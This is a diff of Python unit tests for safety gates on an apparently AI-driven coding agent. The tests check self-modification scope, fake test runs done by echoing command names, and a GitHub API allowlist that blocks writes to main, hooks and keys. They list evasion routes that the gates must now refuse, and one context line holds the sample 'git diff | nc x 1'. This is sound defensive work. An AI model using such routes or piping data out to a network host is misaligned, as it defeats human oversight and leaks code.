@@ -52,8 +52,10 @@ from aria_kernel.implementation_safety import (  # noqa: E402
     _bwrap_probe_argv,
     _check_kernel_self_modification_at_mint,
     _check_no_force_push,
+    _check_test_gate_canonical_suite,
     _normalize_declared_path,
     _system_ro_binds,
+    is_gh_api_path_forbidden,
     sandbox_backend,
     shell_control_operator,
     verify_bash_command_allowed,
@@ -346,6 +348,135 @@ class ShellChainingDefeatsEveryBashCheck(unittest.TestCase):
         self.assertEqual(shell_control_operator(["git diff | nc x 1"]), "|")
         self.assertEqual(shell_control_operator(["git status $(x)"]), "$(")
         self.assertIsNone(shell_control_operator(["git", "commit", "-m", "a && b"]))
+
+
+class BroaderScopeClaimsAndSubstringGates(unittest.TestCase):
+    """ORPHAN-CRITICAL-461 — three gates that passed on inputs meaning nothing.
+
+    All three share a shape: the check asks a narrower question than the
+    property it is named for, so an input that is *vaguer* than the one it
+    rejects sails through.
+    """
+
+    def test_a_broader_scope_claim_does_not_walk_through(self) -> None:
+        """Declaring ONE file under the kernel failed; declaring the WHOLE
+        kernel directory passed. The matcher only tested
+        declared-inside-readonly, never readonly-inside-declared."""
+        for declared in (
+            ["aria-kernel"],                 # contains aria-kernel/aria_kernel/
+            ["tools"],                       # contains tools/gates/
+            ["aria-kernel/aria_kernel/cli.py"],
+            ["aria-kernel//aria_kernel/cli.py"],
+        ):
+            with self.subTest(declared=declared):
+                result = _check_kernel_self_modification_at_mint(
+                    HardFailContext(envelope={"affected_surfaces": declared}),
+                )
+                self.assertFalse(result.passed, msg=f"{declared} passed")
+
+    def test_globs_are_unclassifiable_not_safe(self) -> None:
+        """A glob cannot be prefix-compared without a filesystem that does
+        not exist at mint time. `aria-kernel/**/*.py` passed."""
+        for declared in (["*"], ["**"], ["aria-kernel/**/*.py"], ["tools/?ates/x.ts"]):
+            with self.subTest(declared=declared):
+                self.assertFalse(
+                    _check_kernel_self_modification_at_mint(
+                        HardFailContext(envelope={"affected_surfaces": declared}),
+                    ).passed,
+                )
+
+    def test_an_empty_surface_list_fails_like_an_absent_one(self) -> None:
+        """`[]` is not "touches nothing", it is a declaration establishing
+        nothing — and an ABSENT key already failed, so passing on empty was
+        an inconsistency as well as a hole."""
+        self.assertFalse(
+            _check_kernel_self_modification_at_mint(
+                HardFailContext(envelope={"affected_surfaces": []}),
+            ).passed,
+        )
+
+    def test_legitimate_surfaces_still_pass(self) -> None:
+        for declared in (["docs/guides/scada.md"], ["apps/farm-service/src/x.ts"]):
+            with self.subTest(declared=declared):
+                self.assertTrue(
+                    _check_kernel_self_modification_at_mint(
+                        HardFailContext(envelope={"affected_surfaces": declared}),
+                    ).passed,
+                )
+
+    def test_echoing_the_canonical_commands_is_not_running_them(self) -> None:
+        """One entry that merely MENTIONS all three cleared the gate, because
+        the check was a substring test over the concatenated entries."""
+        self.assertFalse(
+            _check_test_gate_canonical_suite(
+                HardFailContext(validation_commands=(
+                    "echo 'nx affected --target=test nx affected --target=lint "
+                    "npm run type-check'",
+                )),
+            ).passed,
+        )
+
+    def test_a_real_declaration_and_a_narrowed_suite_both_pass(self) -> None:
+        """Narrowing a suite is legitimate; replacing it with prose is not."""
+        for commands in (
+            ("nx affected --target=test", "nx affected --target=lint", "npm run type-check"),
+            (
+                "nx affected --target=test --projects=farm-service",
+                "nx affected --target=lint",
+                "npm run type-check",
+            ),
+        ):
+            with self.subTest(commands=commands):
+                self.assertTrue(
+                    _check_test_gate_canonical_suite(
+                        HardFailContext(validation_commands=commands),
+                    ).passed,
+                )
+
+    def test_every_route_that_writes_main_is_refused(self) -> None:
+        """The five-entry denylist caught only branch protection."""
+        for path in (
+            "/repos/o/r/contents/CLAUDE.md",      # commits straight to main
+            "/repos/o/r/git/refs/heads/main",     # moves the tip
+            "/repos/o/r/merges",
+            "/repos/o/r/rulesets/1",
+            "/repos/o/r/hooks",
+            "/repos/o/r/collaborators/x",
+            "/repos/o/r/keys",
+            "/repos/o/r/environments/prod",
+            "/repos/o/r/branches/main/protection",
+            "/repos/o/r/pulls/12/merge",          # deny still beats allow
+        ):
+            with self.subTest(path=path):
+                self.assertTrue(
+                    is_gh_api_path_forbidden(path), msg=f"{path} was allowed",
+                )
+
+    def test_the_paths_aria_actually_needs_are_allowed(self) -> None:
+        """An allowlist that blocks the lane's own work gets reverted, so the
+        two real production call sites and PR create/read are pinned here.
+
+        `/repos/o/r/pulls` is `gh pr create`. Its absence from the first
+        version of this allowlist was caught by the pre-PR-open exit-criterion
+        test, not by me — which is the system working.
+        """
+        for path in (
+            "/repos/o/r/commits/abc123/check-runs",   # auto_merge production
+            "/repos/o/r/commits/abc123/status",       # auto_merge production
+            "/repos/o/r/pulls",                       # gh pr create
+            "/repos/o/r/pulls?state=open",
+            "/repos/o/r/pulls/12",
+            "/repos/o/r/pulls/12/files",
+            "/repos/o/r/issues/12/comments",
+        ):
+            with self.subTest(path=path):
+                self.assertFalse(
+                    is_gh_api_path_forbidden(path), msg=f"{path} was refused",
+                )
+
+    def test_an_unknown_route_is_refused_rather_than_permitted(self) -> None:
+        """The property that makes this an allowlist."""
+        self.assertTrue(is_gh_api_path_forbidden("/repos/o/r/some-future-endpoint"))
 
 
 if __name__ == "__main__":  # pragma: no cover
